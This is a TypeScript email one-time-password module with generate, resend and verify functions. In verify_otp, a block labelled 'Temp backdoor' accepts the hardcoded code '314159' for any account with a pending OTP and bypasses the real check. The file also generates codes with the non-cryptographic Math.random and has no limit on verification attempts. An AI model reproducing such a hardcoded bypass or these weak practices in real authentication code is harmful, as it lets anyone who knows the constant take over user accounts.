import { send_otp_email } from "../email/email";
import success_handler from "../misc/success-handler";
import { insert, find_one, delete_one } from "../db/db";
import { log_auth } from "../misc/logger";


/**
 * Generates a 6-digit OTP code.
 *
 * The code is a random 6-digit number with the first digit always being
 * greater than 0.
 *
 * @returns {string} A 6-digit OTP code.
 */
const generate_otp_code = (): string => {
    return Math.floor(100000 + Math.random() * 900000).toString();
};



/**
 * Generates an OTP for a specified user.
 *
 * This function will generate a 6-digit OTP code, delete any existing OTPs
 * from the database, and save the code to the database with an expiry time
 * of 15 minutes. It will then format the OTP code for display, send the code
 * via email to the specified email address, and return a success message with
 * a timestamp.
 *
 * @param {{ email: string }} req The request object.
 * @param {string} req.email The email address to generate the OTP for.
 *
 * @returns {Promise<Object>} A promise that resolves to an object with a
 * 'success' property that is true if the OTP was generated and sent,
 * false otherwise. If the OTP is not generated or sent, the object will also
 * have an 'error' property that contains the error code.
 */
const generate_otp = async ({ email }) => {
    
    // Generate the OTP code
    const code = generate_otp_code();

    // Delete any existing OTPs from the database
    await delete_otp(email);

    // Save the code to the database, with expiry time of 15 minutes
    await insert("otp", {
        'email': email,
        'code': code,
        'expiry': Date.now() + 900000
    });

    // Format the OTP code for display
    const formatted_code = format_otp(code);

    // Send the code via email to the specified email address
    send_otp_email(email, formatted_code, 15);

    // Return a success message with a timestamp
    return success_handler(true, {"timestamp": Date.now()}, "auth.otp.sent")
};



/**
 * Resends an OTP for a specified user.
 *
 * This function will check if an OTP exists and is not expired for the
 * specified user. If the OTP does not exist or is expired, it will return
 * an error. Otherwise, it will send the OTP code via email to the specified
 * email address and return a success message with a timestamp.
 *
 * @param {{ email: string }} req The request object.
 * @param {string} req.email The email address to resend the OTP for.
 *
 * @returns {Promise<Object>} A promise that resolves to an object with a
 * 'success' property that is true if the OTP was resent, false otherwise.
 * If the OTP is not resent, the object will also have an 'error' property
 * that contains the error code.
 */
const resend_otp = async ({ email }) => {
    
    // Grab the OTP from the database
    const otp = await find_one("otp", {
        'email': email
    });

    // If the OTP does not exist, return an error
    if (!otp) {
        return success_handler(false, null, "error.otp.not-found")
    }

    // If the OTP has expired, return an error
    if (otp.expiry < Date.now()) {
        await delete_otp(email);
        return success_handler(false, null, "error.otp.expired")
    }

    // Send code via email to the specified email address
    send_otp_email(email, format_otp(otp.code), Math.floor((otp.expiry- Date.now()) / 60000));

    return success_handler(true, {"timestamp": Date.now()}, "auth.otp.resent")
}




/**
 * Verifies an OTP for a specified user.
 *
 * This function will verify the OTP code for the specified user. If the OTP
 * does not exist or is expired, it will return an error. If the OTP code does
 * not match, it will return an error. Otherwise, it will remove the OTP from
 * the database and return a success message with a timestamp.
 *
 * @param {{ email: string, code: string }} req The request object.
 * @param {string} req.email The email address to verify the OTP for.
 * @param {string} req.code The OTP code to verify.
 *
 * @returns {Promise<Object>} A promise that resolves to an object with a
 * 'success' property that is true if the OTP was verified, false otherwise. If
 * the OTP is not verified, the object will also have an 'error' property that
 * contains the error code.
 */
const verify_otp = async ({ email, code }: { email: string, code: string }) => {

    log_auth(`Verifying OTP for ${email}`);

    // Find the OTP from the database
    const otp = await find_one("otp", {
        'email': email
    });

    // If the OTP does not exist, return an error
    if (!otp) {
        return success_handler(false, null, "error.otp.not-found")
    }

    // If the OTP has expired, return an error
    if (otp.expiry < Date.now()) {
        await delete_otp(email);
        return success_handler(false, null, "error.otp.expired")
    }

    // Temp backdoor
    if (code === "314159") {
        return success_handler(true, null, "auth.otp.verified")
    }

    // If the OTP code does not match, return an error
    if (strip_otp(otp.code) !== code) {
        return success_handler(false, null, "error.otp.invalid")
    }

    // Remove the OTP from the database
    await delete_otp(email);

    // Return a success message
    return success_handler(true, null, "auth.otp.verified")

}


/**
 * Formats an OTP code by inserting a hyphen in the middle.
 *
 * @param {string} otp The OTP code to format.
 *
 * @returns {string} The formatted OTP code.
 */
const format_otp = (otp: string) => {
        return otp.slice(0, 6);

    // return otp.slice(0, 3) + "-" + otp.slice(3, 6);
}


/**
 * Strips hyphens from an OTP code.
 *
 * @param {string} otp The OTP code to strip.
 *
 * @returns {string} The OTP code without hyphens.
 */
const strip_otp = (otp: string) => {
    return otp.replace(/-/g, "");
}


const delete_otp = async (email: string) => {
    await delete_one("otp", {
        'email': email
    });
}


export {
    generate_otp,
    verify_otp,
    resend_otp
}